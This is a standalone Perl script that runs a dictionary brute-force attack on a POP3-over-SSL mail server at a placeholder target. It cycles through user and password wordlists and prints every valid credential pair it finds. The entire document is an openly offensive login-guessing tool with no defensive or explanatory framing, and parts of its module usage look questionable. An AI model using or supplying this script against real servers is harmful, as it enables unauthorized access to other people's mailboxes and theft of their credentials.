#!/usr/bin/env perl
use strict;
use warnings;
use Net::POP3::SSLWrapper;
use IO::Socket::SSL;

# PEM file if required
my $pem_file = 'ca.pem';

# Create a new POP3 object with SSL
my $pop3 = Net::POP3::SSLWrapper->new(
    'TARGET_IP',
    Port    => 995,
    Timeout => 30,
    Debug   => 1,
    SSL_ca_file => $pem_file,  # Add this line if you need to use a specific CA certificate
);

# Check if the POP3 object was created successfully
unless ($pop3) {
    die "Failed to connect to POP3 server: $!";
}

# Read user and password lists
my @userlist = file2array('users.txt');
my @passlist = file2array('passwordlist.txt');

print "[*] Searching for valid POP3 logins...\n";

# Iterate over user and password lists to find valid logins
foreach my $user (@userlist) {
    foreach my $pass (@passlist) {
        if ($pop3->login($user, $pass)) {
            print "[+] Found Login: $user:$pass\n";
            last;  # Optionally, stop after finding the first valid login
        }
    }
    sleep 1;
}

$pop3->quit;

# Function to read a file into an array
sub file2array {
    my $file = shift;
    my @array;
    open(my $fh, '<', $file) or die "Could not open file '$file': $!";
    while (<$fh>) {
        chomp($_);
        push(@array, $_);
    }
    close($fh) or die "Could not close file '$file': $!";
    return @array;
}
